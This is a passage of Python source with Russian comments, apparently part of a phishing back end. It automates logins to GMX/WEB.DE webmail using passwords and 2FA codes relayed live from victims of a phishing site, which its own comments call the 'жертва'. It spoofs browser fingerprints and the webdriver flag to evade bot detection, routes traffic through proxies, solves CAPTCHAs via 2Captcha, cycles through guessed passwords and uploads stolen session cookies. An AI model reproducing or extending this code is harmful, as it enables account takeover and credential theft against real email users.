            _save_cookies_for_lead_mode(context, email)
            log("2FA", "успешный вход после ввода 2FA")
            if on_lead_success_hold:
                try:
                    on_lead_success_hold()
                except Exception:
                    pass
            return "success"
        if outcome == "wrong":
            last_consumed_submitted_at = submitted_at or last_consumed_submitted_at
            log("2FA", f"неверный 2FA · попытка {round_idx + 1}/{max_rounds} — жду новый код с фишинга")
            if on_wrong_two_fa:
                try:
                    on_wrong_two_fa()
                except Exception:
                    pass
            continue
        log("2FA", "таймаут после отправки кода (нет почты и нет явной ошибки)")
        return "error"
    log("2FA", "исчерпаны попытки ввода 2FA")
    return "wrong_2fa"


def login_gmx(
    email: str = None,
    password: str = None,
    api_key: str = None,
    proxy_str: str = None,
    proxy_config: dict | None = None,
    headless: bool = True,
    lead_mode: bool = False,
    get_password: Optional[Callable[..., Any]] = None,
    wait_for_new_password: Optional[Callable[..., Any]] = None,
    on_push_wait_start: Optional[Callable[..., Any]] = None,
    check_resend_requested: Optional[Callable[..., Any]] = None,
    on_resend_done: Optional[Callable[..., Any]] = None,
    on_wrong_credentials: Optional[Callable[..., Any]] = None,
    poll_two_fa_code: Optional[Callable[..., Any]] = None,
    on_two_factor_wait_start: Optional[Callable[..., Any]] = None,
    on_wrong_two_fa: Optional[Callable[..., Any]] = None,
    fingerprint_index: int | None = None,
    auth_url_attempt_index: int = 0,
    lead_id: str | None = None,
    automation_profile: dict | None = None,
    force_pool_fingerprint: bool = False,
    hold_session_after_lead_success: bool = False,
    cookies_push: dict | None = None,
    after_mail_success_fn: Optional[Callable[[], None]] = None,
):
    """
    lead_mode: для симуляции лида (отдельный скрипт). Возвращает "wrong_credentials" | "push" | "success" | "error".
    get_password: при lead_mode и пустом пароле вызывается, пока не вернёт строку (ожидание пароля из админки).
    wait_for_new_password: при lead_mode и неверных данных вызывается один раз; ждёт пока админка передаст пароль (long-poll). Возвращает новый пароль или None.
    on_push_wait_start: при lead_mode вызывается один раз при появлении страницы пуша, до ожидания подтверждения (чтобы админка сразу показала «требуется пуш»).
    check_resend_requested: при lead_mode в цикле ожидания пуша вызывается; если True — скрипт кликает «Mitteilung erneut senden» и вызывает on_resend_done.
    on_resend_done(success: bool, message: str | None): вызывается после попытки переотправить пуш (успех или причина ошибки).
    on_wrong_credentials: при lead_mode вызывается сразу при обнаружении неверного пароля, до ожидания нового (чтобы лид сразу получил status=error в админке).
    poll_two_fa_code: lead_mode — (last_submitted_at) -> (code, submitted_at) | None; код 2FA с сервера (фишинг).
    on_two_factor_wait_start: lead_mode — перед ожиданием кода (отправить two_factor в API).
    on_wrong_two_fa: lead_mode — после неверного кода на WEB.DE (опционально уведомить сервер).
    force_pool_fingerprint: True — взять UA/экран из пула webde_fingerprints.json по fingerprint_index, игнорируя playwright из automation_profile (для ретраев после блока).
    hold_session_after_lead_success: lead_mode — не закрывать браузер при success; сессия в take_lead_held_browser_session() для оркестрации (Klein).
    cookies_push: lead_mode — {base_url, lead_id, worker_secret?} → POST /api/lead-cookies-upload (SQLite); иначе файл login/cookies.
    after_mail_success_fn: если задан вместе с hold_session_after_lead_success — вызывается в finally login_webde, пока активен sync_playwright (compose+фильтры+Klein). Иначе Playwright уже остановлен и фильтры падают с Event loop is closed.
    """
    email = email or EMAIL
    password = password or PASSWORD
    if not email or (not password and not (lead_mode and get_password)):
        file_email, file_password = load_credentials_from_file()
        email = email or file_email
        password = password or file_password
    api_key = api_key or API_KEY
    proxy_str = proxy_str if proxy_str is not None else PROXY_STR
    # CaptchaFox / 2Captcha должны использовать тот же прокси, что и браузер (не старый PROXY из .env)
    if proxy_config:
        derived = proxy_config_to_proxy_string(proxy_config)
        if derived:
            proxy_str = derived
    elif lead_mode:
        # Для автовхода не используем старый PROXY из .env, если список прокси не дал текущий proxy_config.
        proxy_str = ""

    if not email:
        raise ValueError("Укажите email (логин).")
    if not lead_mode and not password:
        raise ValueError("Укажите пароль или используйте lead_mode с get_password.")
    global _LOG_EMAIL_INLINE
    _LOG_EMAIL_INLINE = (email or "").strip()

    use_2captcha = bool(api_key)
    if not use_2captcha:
        cfg_bits: list[str] = ["капча: слайдер (2Captcha нет)"]
        has_display = bool(os.environ.get("DISPLAY")) or os.name == "nt"
        if headless and has_display:
            cfg_bits.append("окно браузера: да (есть DISPLAY)")
            headless = False
        elif headless and not has_display:
            cfg_bits.append("headless (нет DISPLAY) — капча: 2Captcha или xvfb")
        log("CONFIG", " · ".join(cfg_bits))
    else:
        log("CONFIG", "капча: 2Captcha")

    # Трастовые отпечатки/железо — много комбинаций; для лида выбор по hash(email), при ретраях — перебор
    short_id = (str(lead_id).strip() if lead_id else "")[:10]
    mask_email = (email or "").strip()
    set_log_prefix((f"[lead:{short_id}] [email:{mask_email}]" if short_id else (f"[email:{mask_email}]" if mask_email else "")))
    _reset_script_idle_watch()

    # Пул отпечатков: login/webde_fingerprints.json (100 шт., общий с сайтом). Генерация: npm run build:webde-fingerprints
    FINGERPRINTS = _load_webde_fingerprints_playwright()
    if not FINGERPRINTS:
        log("CONFIG", "webde_fingerprints.json не найден или пуст — минимальный встроенный пул (положите JSON рядом с webde_login.py)")
        _DE = {"locale": "de-DE", "timezone_id": "Europe/Berlin", "accept_language": "de-DE,de;q=0.9,en;q=0.8"}
        _LANGS = ["de-DE", "de", "en-US", "en"]
        FINGERPRINTS = [
            {**_DE, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "viewport": {"width": 1920, "height": 1080}, "platform": "Win32", "hardware_concurrency": 8, "device_memory": 8, "max_touch_points": 0, "languages": _LANGS},
            {**_DE, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "viewport": {"width": 1366, "height": 768}, "platform": "Win32", "hardware_concurrency": 4, "device_memory": 4, "max_touch_points": 0, "languages": _LANGS},
            {**_DE, "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "viewport": {"width": 2560, "height": 1440}, "platform": "Win32", "hardware_concurrency": 12, "device_memory": 16, "max_touch_points": 0, "languages": _LANGS},
        ]
    N_FINGERPRINTS = len(FINGERPRINTS)

    browser_engine = "chromium"
    is_mobile = False
    has_touch = False
    device_scale_factor = 1.0
    used_api_profile = False

    force_pool = bool(force_pool_fingerprint)
    if automation_profile and isinstance(automation_profile, dict) and not force_pool:
        pw_block = automation_profile.get("playwright")
        custom_fp = _fp_from_api_playwright(pw_block) if isinstance(pw_block, dict) else None
        if custom_fp:
            fp = custom_fp
            used_api_profile = True
            browser_engine = _browser_engine_from_automation_profile(automation_profile)
            if isinstance(pw_block, dict):
                is_mobile = bool(pw_block.get("isMobile"))
                has_touch = bool(pw_block.get("hasTouch")) if "hasTouch" in pw_block else is_mobile
                try:
                    device_scale_factor = float(pw_block.get("deviceScaleFactor") or 1.0)
                except (TypeError, ValueError):
                    device_scale_factor = 1.0
            log("Профиль", f"лид API: engine={browser_engine} mobile={is_mobile} UA[:70]={(fp.get('user_agent') or '')[:70]!r}")

    ch_hints: dict[str, str] = {}
    if used_api_profile and automation_profile and isinstance(automation_profile.get("playwright"), dict):
        pb = automation_profile["playwright"]
        if pb.get("secChUa"):
            ch_hints["Sec-CH-UA"] = str(pb["secChUa"])[:500]
        if pb.get("secChUaMobile") is not None and str(pb.get("secChUaMobile")).strip():
            ch_hints["Sec-CH-UA-Mobile"] = str(pb["secChUaMobile"])[:80]
        if pb.get("secChUaPlatform"):
            ch_hints["Sec-CH-UA-Platform"] = str(pb["secChUaPlatform"])[:120]

    if not used_api_profile:
        if fingerprint_index is not None:
            fp = FINGERPRINTS[fingerprint_index % len(FINGERPRINTS)]
        else:
            fp = random.choice(FINGERPRINTS)

    launch_args = [
        "--disable-blink-features=AutomationControlled",
        "--no-first-run",
        "--no-default-browser-check",
    ]
    if headless:
        # Не использовать --single-process / --no-zygote: на Linux + headless_shell дают мгновенный краш и TargetClosedError.
        launch_args.extend([
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-software-rasterizer",
            "--disable-background-networking",
            "--disable-default-apps",
            "--disable-sync",
            "--metrics-recording-only",
            "--mute-audio",
        ])
    launch_options = {
        "headless": headless,
        "ignore_default_args": ["--enable-automation"],
        "args": launch_args,
    }
    if browser_engine == "chromium" and USE_CHROME:
        launch_options["channel"] = "chrome"

    with _cookies_push_scope(cookies_push), sync_playwright() as p:
        clear_lead_held_browser_session()
        effective_engine = browser_engine
        browser = None
        if browser_engine == "webkit":
            try:
                browser = p.webkit.launch(headless=headless)
            except Exception as e:
                log("Профиль", f"WebKit недоступен ({type(e).__name__}) — fallback Chromium, User-Agent без изменений")
                effective_engine = "chromium"
        if browser is None and browser_engine == "firefox":
            try:
                browser = p.firefox.launch(headless=headless)
            except Exception as e:
                log("Профиль", f"Firefox недоступен ({type(e).__name__}) — fallback Chromium")
                effective_engine = "chromium"
        if browser is None:
            lo = {
                "headless": headless,
                "ignore_default_args": ["--enable-automation"],
                "args": launch_args,
            }
            if USE_CHROME:
                lo["channel"] = "chrome"
            try:
                browser = _launch_chromium_resilient(p, lo)
            except Exception:
                if USE_CHROME and lo.pop("channel", None) is not None:
                    log("Старт", "Запускаю встроенный Chromium")
                    browser = _launch_chromium_resilient(p, lo)
                else:
                    raise
        if not headless:
            log("Старт", "Браузер открыт")
        extra_headers: dict[str, str] = {"Accept-Language": fp["accept_language"]}
        if effective_engine == "chromium" and ch_hints:
            extra_headers.update(ch_hints)
        context_options = {
            "locale": fp["locale"],
            "user_agent": fp["user_agent"],
            "viewport": fp["viewport"],
            "is_mobile": is_mobile,
            "has_touch": has_touch,
            "device_scale_factor": device_scale_factor,
            "timezone_id": fp["timezone_id"],
            "permissions": ["geolocation"],
            "extra_http_headers": extra_headers,
        }
        if proxy_config:
            context_options["proxy"] = proxy_config
            log("Старт", f"Прокси: {proxy_config.get('server', '')}")
        context = browser.new_context(**context_options)
        # Маскировка автоматизации: webdriver, платформа, ядра, память, языки (как в webde_fingerprints.json)
        hw = fp["hardware_concurrency"]
        mem = fp.get("device_memory")
        plat = fp["platform"].replace("\\", "\\\\").replace("'", "\\'")
        mtp = int(fp.get("max_touch_points") or 0)
        langs_js = json.dumps(fp.get("languages") or ["de-DE", "de", "en-US", "en"])
        mem_line = (
            f"Object.defineProperty(navigator, 'deviceMemory', {{ get: () => {int(mem)} }});"
            if mem is not None
            else ""
        )
        chrome_inject = ""
        if effective_engine == "chromium":
            chrome_inject = """
            if (!window.chrome) window.chrome = {};
            if (!window.chrome.runtime) window.chrome.runtime = {};
            """
        context.add_init_script(
            f"""
            Object.defineProperty(navigator, 'webdriver', {{ get: () => undefined }});
            Object.defineProperty(navigator, 'platform', {{ get: () => '{plat}' }});
            Object.defineProperty(navigator, 'hardwareConcurrency', {{ get: () => {hw} }});
            {mem_line}
            Object.defineProperty(navigator, 'maxTouchPoints', {{ get: () => {mtp} }});
            Object.defineProperty(navigator, 'languages', {{ get: () => {langs_js} }});
            {chrome_inject}
        """
        )
        page = context.new_page()
        page.set_default_navigation_timeout(120000)
        page.set_default_timeout(120000)
        vp = fp.get("viewport") or {}
        log(
            "ДИАГНО",
            "контекст браузера",
            f"engine={effective_engine} (запрошен {browser_engine}) mobile={is_mobile} "
            f"viewport={vp.get('width')}x{vp.get('height')} Sec-CH_заголовков={len(ch_hints)} "
            f"UA[:90]={(fp.get('user_agent') or '')[:90]!r}",
        )

        # Пароли из password.txt — по одному на строку; используются при неверном пароле из accounts.txt
        extra_passwords: list[str] = []
        if PASSWORD_FILE.is_file():
            with open(PASSWORD_FILE, "r", encoding="utf-8") as f:
                extra_passwords = [line.strip() for line in f if line.strip()]

        def _lead_hold_prepare(loc_page=None):
            if not lead_mode or not hold_session_after_lead_success:
                return
            global _LEAD_HELD_BROWSER_SESSION
            try:
                mb = _find_mailbox_page(context)
                use_page = mb if mb is not None else (loc_page if loc_page is not None else page)
            except Exception:
                use_page = loc_page if loc_page is not None else page
            _LEAD_HELD_BROWSER_SESSION = {"browser": browser, "context": context, "page": use_page}

        _hold_cb = _lead_hold_prepare if (lead_mode and hold_session_after_lead_success) else None

        try:
            auth_url = get_auth_gmx_url_for_attempt(AUTH_GMX_URL, auth_url_attempt_index)
            if DIRECT_AUTH:
                log("Старт", "открываю auth.gmx.net")
                page.goto(auth_url, wait_until="load", timeout=120000)
                time.sleep(2)
                if _is_login_temporarily_unavailable(page):
                    log_page_diag(page, "сразу после goto: блок «Login vorübergehend»")
                    alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                    raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
            else:
                log("Старт", "открываю страницу входа web.de")
                page.goto(LOGIN_URL, wait_until="load", timeout=120000)
                time.sleep(2)
                if _is_login_temporarily_unavailable(page):
                    log_page_diag(page, "после anmelden.gmx.net: блок «Login vorübergehend»")
                    alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                    raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)

                # Окно согласия (Werbung/Tracking) — закрыть «Akzeptieren und weiter»
                if close_consent_popup(page):
                    log("Согласие", "Жду перезагрузку после согласия")
                    time.sleep(3)
                else:
                    log("Согласие", "Окно согласия не найдено — повтор через 2 сек")
                    time.sleep(2)
                    if close_consent_popup(page):
                        time.sleep(3)
                    else:
                        log("Согласие", "Окно согласия не найдено или уже закрыто")

                # Убедиться, что оверлей согласия скрыт (иначе клик по «Zum WEB.DE Login» перехватится)
                try:
                    page.locator(".permission-layer-default").wait_for(state="hidden", timeout=5000)
                except Exception:
                    log("Согласие", "Повторно закрываю окно согласия")
                    close_consent_popup(page, wait_for_appear=5)
                time.sleep(0.5)

                # Переход на страницу с формой входа: auth.gmx.net/login или кнопка «Zum WEB.DE Login»
                use_auth_url = AUTH_GMX_URL and "auth.gmx.net" in AUTH_GMX_URL
                if use_auth_url:
                    log("Вход", "переход на auth.gmx.net", verbose_only=True)
                    page.goto(auth_url, wait_until="load", timeout=90000)
                    time.sleep(2)
                else:
                    log("Вход", "клик «Zum GMX Login»", verbose_only=True)
                    for loc in [
                        page.get_by_role("link", name="Zum GMX Login"),
                        page.get_by_role("button", name="Zum GMX Login"),
                        page.get_by_text("Zum GMX Login"),
                    ]:
                        if loc.count() > 0:
                            loc.first.click()
                            time.sleep(2)
                            page.wait_for_load_state("load", timeout=15000)
                            break
                    else:
                        log("Вход", "прямой переход на форму логина", verbose_only=True)
                        page.goto(LOGIN_FORM_URL, wait_until="load", timeout=90000)
                        time.sleep(2)
            log("Вход", "форма логина готова")
            try:
                log("ДИАГНО", "форма входа (шаг 0)", f"url={page.url[:200]!r} title={page.title()[:90]!r}")
            except Exception:
                pass
            if _is_login_temporarily_unavailable(page):
                log_page_diag(page, "на форме входа: «Login vorübergehend»")
                alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)

            # Если попали на consent-management или поля email нет — пробуем auth.gmx.net или закрываем согласие
            if "consent-management" in page.url or page.locator('input[type="email"], input[name="username"], input[name="email"]').count() == 0:
                log("Вход", "нет формы — auth.gmx.net", verbose_only=True)
                page.goto(auth_url, wait_until="load", timeout=90000)
                time.sleep(2)
                if page.locator('input[type="email"], input[name="username"], input[name="email"]').count() == 0:
                    close_consent_popup(page, wait_for_appear=10)
                    time.sleep(2)

            # Пауза между шагами, чтобы капча и слайдер успели отрисоваться
            step_delay = 1.0

            # Порядок: email → Weiter → капча (если есть) → поле пароля → пароль → Weiter/Login
            log("Вход", "ввожу email → Weiter")
            email_selector = 'input[type="email"], input[name="username"], input[name="email"], input[placeholder*="E-Mail"], input#username'
            _wait_and_fill(page, email_selector, email, timeout=25000)
            time.sleep(step_delay)
            btn = page.locator('button[type="submit"], input[type="submit"], [data-testid="next"]').first
            if btn.count() > 0:
                btn.click()
            time.sleep(step_delay)
            try:
                page.wait_for_load_state("load", timeout=15000)
            except Exception:
                pass

            # Ждём поле пароля до 60 сек; если сначала появилась капча «Ich bin ein Mensch» — проходим её, потом снова ждём пароль
            pw_selector_any = 'input[type="password"], input[name="password"], input[name="credential"], input[id="password"], input[placeholder*="Passwort"], input[autocomplete="current-password"]'
            pw_found = False
            wait_total = 60
            step_wait = 2
            weiter_btn_sel = 'button[type="submit"], input[type="submit"], [data-testid="next"], button:has-text("Weiter")'
            for elapsed in range(0, wait_total, step_wait):
                _check_script_idle_or_raise()
                if _is_login_temporarily_unavailable(page):
                    log_page_diag(page, "в цикле ожидания пароля: «Login vorübergehend»")
                    alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                    raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
                if page.locator(pw_selector_any).first.count() > 0 and page.locator(pw_selector_any).first.is_visible():
                    pw_found = True
                    break
                time.sleep(0.3)
                if page.locator(pw_selector_any).first.count() > 0 and page.locator(pw_selector_any).first.is_visible():
                    pw_found = True
                    break
                # После Weiter ничего не произошло (кнопка всё ещё видна, пароля/капчи нет) — выход, смена IP и железа
                if elapsed >= 14 and page.locator(weiter_btn_sel).first.count() > 0 and page.locator(weiter_btn_sel).first.is_visible():
                    log_page_diag(page, f"через {elapsed}s после Weiter: пароль/капча не появились, кнопка Weiter ещё видна")
                    alert("Weiter без эффекта", "следующая комбинация прокси/отпечаток")
                    raise LoginTemporarilyUnavailable("Weiter без перехода")
                # Капча появилась до поля пароля — проходим её (только если виджет капчи реально виден)
                captcha_detected = detect_captcha_type(page) == "captchafox" or page.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0
                if captcha_detected:
                    slider_visible = page.locator(".cf-slider__button").first.count() > 0 and page.locator(".cf-slider__button").first.is_visible()
                    checkbox_visible = page.get_by_text("Ich bin ein Mensch", exact=False).first.is_visible() if page.get_by_text("Ich bin ein Mensch", exact=False).first.count() > 0 else False
                    if not slider_visible and not checkbox_visible:
                        time.sleep(step_wait)
                        continue
                    log("Капча", "решаю (CaptchaFox слайдер)")
                    if use_2captcha:
                        try:
                            website_key = get_captchafox_website_key(page)
                            if website_key and proxy_str:
                                user_agent = page.evaluate("() => navigator.userAgent")
                                token = solve_captchafox_with_proxy_string(api_key, LOGIN_URL, website_key, user_agent, proxy_str)
                                inject_captchafox_token(page, token)
                                log("Капча", "Токен 2Captcha подставлен")
                                time.sleep(2)
                                continue
                        except Exception as e:
                            alert("2Captcha не сработал", str(e)[:80])
                    if not solve_captchafox_slider_manually(page):
                        alert("Капча не пройдена", "Слайдер не сработал или чекбокс не найден — смена IP и повтор")
                        raise LoginTemporarilyUnavailable("Капча не пройдена")
                    time.sleep(2)
                    continue
                time.sleep(step_wait)
            if not pw_found:
                try:
                    page.wait_for_selector(pw_selector_any, state="visible", timeout=5000)
                    pw_found = True
                except Exception:
                    pass
            if not pw_found:
                log_page_diag(page, "таймаут 60с: поле пароля так и не появилось")
                alert("Поле пароля не появилось за 60 сек", "Капча не пройдена или страница не перешла — смена IP и повтор")
                raise LoginTemporarilyUnavailable("Поле пароля не появилось")
            time.sleep(step_delay)
            if lead_mode and get_password and (not password or not str(password).strip()):
                log("Вход", "жду пароль (API / админка, до 3 мин)")
                wait_log(
                    "этап: пароль в контексте лида пуст",
                    "опрос GET /api/lead-credentials каждые 2с, макс 90×2=180с — пока жертва не введёт пароль на сайте",
                )
                for _i in range(90):  # 90 * 2 сек = 3 мин
                    _check_script_idle_or_raise()
                    time.sleep(2)
                    password = (get_password() or "").strip()
                    if password:
                        wait_log("опрос пароля", f"пароль появился в API после ~{(_i + 1) * 2}с")
                        break
                    if _i > 0 and _i % 15 == 0:
                        wait_log(
                            "опрос пароля лида",
                            f"прошло ~{(_i + 1) * 2}с / 180с — GET credentials ещё без пароля",
                        )
                if not password:
                    alert("Пароль не получен за 3 мин", "Сессия закрыта")
                    if lead_mode:
                        # Таймаут ожидания нового пароля от админки: не редиректим на смену пароля,
                        # а даём пользователю перезайти и ввести данные заново.
                        return "password_timeout"
                    raise RuntimeError("Пароль не получен")
            log("Вход", "пароль введён → Login")
            page.locator(pw_selector_any).first.fill(password)
            time.sleep(step_delay)

            # Проверка капчи (может быть до или после ввода пароля)
            captcha_type = detect_captcha_type(page)
            if captcha_type:
                log("Капча", f"ещё капча: {captcha_type}", verbose_only=True)
            if captcha_type and use_2captcha:
                log("Капча", "решаю через 2Captcha")
                if captcha_type == "captchafox":
                    if not proxy_str:
                        raise ValueError("Для CaptchaFox нужен прокси. Задайте PROXY в .env (например: http://user:pass@host:port)")
                    website_key = get_captchafox_website_key(page)
                    if not website_key:
                        raise RuntimeError("Не удалось найти websiteKey CaptchaFox на странице")
                    user_agent = page.evaluate("() => navigator.userAgent")
                    token = solve_captchafox_with_proxy_string(api_key, LOGIN_URL, website_key, user_agent, proxy_str)
                    inject_captchafox_token(page, token)
                    log("Капча", "токен 2Captcha подставлен")
                elif captcha_type == "image":
                    solve_and_fill_image_captcha(page, api_key)
                    log("Капча", "Текст капчи введён")
            elif captcha_type and not use_2captcha:
                if captcha_type == "captchafox":
                    if not solve_captchafox_slider_manually(page):
                        alert("Капча не пройдена", "Слайдер не сработал — смена IP и повтор")
                        raise LoginTemporarilyUnavailable("Капча не пройдена")
                else:
                    alert("Обнаружена капча другого типа (не слайдер)", "Требуется 2Captcha или смена IP")
                    raise LoginTemporarilyUnavailable("Капча не поддерживается")

            # Отправка формы входа (Weiter/Login после пароля) и цикл при неверных данных
            submit_btn = page.locator(
                'button[type="submit"], input[type="submit"], [data-testid="login"], '
                'button:has-text("Login"), button:has-text("Weiter"), input[value="Login"], input[value="Weiter"]'
            ).first
            max_password_retries = 20

            def _api_password_newer_than_attempt() -> str | None:
                """Пароль уже мог обновиться в API до POST /api/webde-wait-password (жертва отправила форму раньше)."""
                if not lead_mode or not get_password:
                    return None
                p = (get_password() or "").strip()
                if p and p != (password or ""):
                    return p
                return None

            while max_password_retries > 0:
                max_password_retries -= 1
                if max_password_retries == 19:
                    log("Вход", "отправка формы входа")
                if submit_btn.count() > 0:
                    submit_btn.click()
                post_login = _wait_post_login_for_wrong_or_block(page, pw_selector_any, max_sec=22.0)
                if post_login == "two_factor":
                    if lead_mode and poll_two_fa_code:
                        tf = _lead_mode_two_factor_challenge(
                            page,
                            context,
                            email,
                            poll_two_fa_code=poll_two_fa_code,
                            on_two_factor_wait_start=on_two_factor_wait_start,
                            on_wrong_two_fa=on_wrong_two_fa,
                            on_lead_success_hold=_hold_cb,
                        )
                        if tf != "two_factor":
                            return tf
                    if lead_mode:
                        log("2FA", "Результат: Zwei-Faktor-Authentifizierung (interception.gmx.net)")
                        return "two_factor"
                    return False
                if post_login == "temp_unavailable":
                    log_page_diag(page, "после Login: «Login vorübergehend nicht möglich»")
                    alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                    raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
                if post_login != "wrong_credentials" and _is_login_temporarily_unavailable(page):
                    log_page_diag(page, "после ожидания: «Login vorübergehend»")
                    alert("Вход временно недоступен (Login vorübergehend nicht möglich)", "Закрываю браузер, пробую другую комбинацию (прокси + отпечаток)")
                    raise LoginTemporarilyUnavailable(LOGIN_TEMPORARILY_UNAVAILABLE_TEXT)
                time.sleep(0.35)
                creds_wrong = post_login == "wrong_credentials" or (
                    _is_wrong_credentials(page) and _still_on_login_surface(page, pw_selector_any)
                )
                if creds_wrong:
                    if lead_mode and wait_for_new_password:
                        if on_wrong_credentials:
                            try:
                                on_wrong_credentials()
                            except Exception:
                                pass
                        fresh_pw = _api_password_newer_than_attempt()
                        if fresh_pw:
                            wait_log(
                                "этап: Zugangsdaten / неверный пароль",
                                "в API уже другой пароль (до long-poll) — повтор Login",
                            )
                            password = fresh_pw
                            log("Пароль", "Подставляю пароль из API и повторяю вход")
                            page.locator(pw_selector_any).first.fill(password)
                            time.sleep(step_delay)
                            continue
                        log("Пароль", "Неверные данные — жду новый пароль от админки (long-poll, макс 3 мин)")
                        wait_log(
                            "этап: Zugangsdaten / неверный пароль",
                            "POST /api/webde-wait-password — один HTTP до ~3 мин; скрипт стоит, пока админ не сохранит новый пароль в лиде",
                        )
                        new_password = wait_for_new_password()
                        if not new_password:
                            fresh_after = _api_password_newer_than_attempt()
                            if fresh_after:
                                wait_log(
                                    "long-poll пароля",
                                    "таймаут long-poll, но в API уже новый пароль — использую",
                                )
                                new_password = fresh_after
                        if new_password and new_password != (password or ""):
                            wait_log("long-poll пароля", "получен новый пароль от админки — подставляю и повторяю Login")
                            password = new_password
                            log("Пароль", "Ввожу новый пароль и повторяю вход")
                            page.locator(pw_selector_any).first.fill(password)
                            time.sleep(step_delay)
                            continue
                        if not new_password:
                            wait_log("long-poll пароля", "таймаут или пустой ответ — password_timeout (408 в API)")
                            log("Успех", "Результат: password timeout (пароль от админки не передан)")
                            return "password_timeout"
                        wait_log("long-poll пароля", "пароль совпал со старым — wrong_credentials")
                        log("Успех", "Результат: неверные данные (таймаут или пароль не передан)")
                        return "wrong_credentials"
                    if lead_mode and get_password:
                        log("Пароль", "Неверные данные — жду новый пароль по API (макс 3 мин)")
                        wait_log(
                            "этап: неверный пароль (ветка без long-poll)",
                            "опрос get_password каждые 2с до 180с",
                        )
                        new_password = None
                        for _j in range(90):
                            _check_script_idle_or_raise()
                            time.sleep(2)
                            new_password = (get_password() or "").strip()
                            if new_password and new_password != (password or ""):
                                wait_log("опрос пароля после ошибки", f"новый пароль после ~{(_j + 1) * 2}с")
                                break
                            if _j > 0 and _j % 15 == 0:
                                wait_log(
                                    "опрос пароля после ошибки",
                                    f"прошло ~{(_j + 1) * 2}с / 180с",
                                )
                        if new_password and new_password != (password or ""):
                            password = new_password
                            log("Пароль", "Ввожу новый пароль и повторяю вход")
                            page.locator(pw_selector_any).first.fill(password)
                            time.sleep(step_delay)
                            continue
                        log("Успех", "Результат: неверные данные (новый пароль не поступил)")
                        return "wrong_credentials"
                    if lead_mode:
                        log("Успех", "Результат: неверные данные")
                        return "wrong_credentials"
                    if extra_passwords:
                        new_password = extra_passwords.pop(0)
                        log("Пароль", "Неверный пароль — беру следующий из password.txt")
                    else:
                        alert("Неверный логин или пароль", "Добавьте пароли в password.txt для автоматической подстановки")
                        return False
                    if not new_password:
                        log("Пароль", "Пароли в password.txt закончились — выход")
                        return False
                    log("Пароль", "Ввожу следующий пароль и повторяю вход")
                    page.locator(pw_selector_any).first.fill(new_password)
                    time.sleep(step_delay)
                    continue

                # Успех проверяем первым: редирект в почту, на смену пароля или форма логина исчезла (пуша не было)
                if _gmx_portal_host_in_url(page.url) and ("mail" in page.url or "posteingang" in page.url):
                    if lead_mode:
                        _save_cookies_for_lead_mode(context, email)
                        log("Успех", "Результат: успешный вход (почта)")
                        _lead_hold_prepare()
                        return "success"
                    log("Успех", "Вход выполнен, сохраняю куки")
                    _wait_then_save_cookies_and_exit(context, email)
                    return True
                if "pwchange.gmx.net" in page.url or "WeakPasswordInfoAdvice" in page.url:
                    if lead_mode:
                        _save_cookies_for_lead_mode(context, email)
                        log("Успех", "Результат: успешный вход (смена пароля)")
                        _lead_hold_prepare()
                        return "success"
                    log("Успех", "Вход выполнен (сайт предлагает сменить пароль)")
                    _wait_then_save_cookies_and_exit(context, email)
                    return True
                if _url_is_help_page_after_login(page.url):
                    return _on_help_page_success_then_pwchange(
                        page, context, email, lead_mode, on_lead_success_hold=_hold_cb
                    )
                # Даём редиректу время; проверяем текущую вкладку и все вкладки (редирект мог открыть новую) — избегаем ложного «пуш»
                time.sleep(2)
                if _url_is_help_page_after_login(page.url):
                    return _on_help_page_success_then_pwchange(
                        page, context, email, lead_mode, on_lead_success_hold=_hold_cb
                    )
                if _url_is_mailbox_or_pwchange(page.url):
                    if lead_mode:
                        _save_cookies_for_lead_mode(context, email)
                        log("Успех", "Результат: успешный вход (почта, после ожидания редиректа)")
                        _lead_hold_prepare()
                        return "success"
                    _wait_then_save_cookies_and_exit(context, email)
                    return True
                mailbox_tab = _find_mailbox_page(context)
                if mailbox_tab is not None:
                    if lead_mode:
                        _save_cookies_for_lead_mode(context, email)
                        log("Успех", "Результат: успешный вход (почта в другой вкладке)")
                        _lead_hold_prepare()
                        return "success"
                    _wait_then_save_cookies_and_exit(context, email)
                    return True
                # Страницу «подтвердите пуш» проверяем до «форма исчезла»: на странице пуша нет формы входа — иначе ошибочно вернётся success
                if _is_push_confirmation_page(page):
                    # Перед отправкой «пуш» на сервер — последняя проверка: не оказались ли уже в почте (медленный редирект / новая вкладка)
                    time.sleep(1)
                    if _url_is_mailbox_or_pwchange(page.url):
                        if lead_mode:
                            _save_cookies_for_lead_mode(context, email)
                            log("Успех", "Результат: успешный вход (почта, редирект после проверки пуша)")
                            _lead_hold_prepare()
                            return "success"
                        _wait_then_save_cookies_and_exit(context, email)
                        return True
                    if _find_mailbox_page(context) is not None:
                        if lead_mode:
                            _save_cookies_for_lead_mode(context, email)
                            log("Успех", "Результат: успешный вход (почта в другой вкладке, до отправки пуша)")
                            _lead_hold_prepare()
                            return "success"
                        _wait_then_save_cookies_and_exit(context, email)
                        return True
                    if lead_mode:
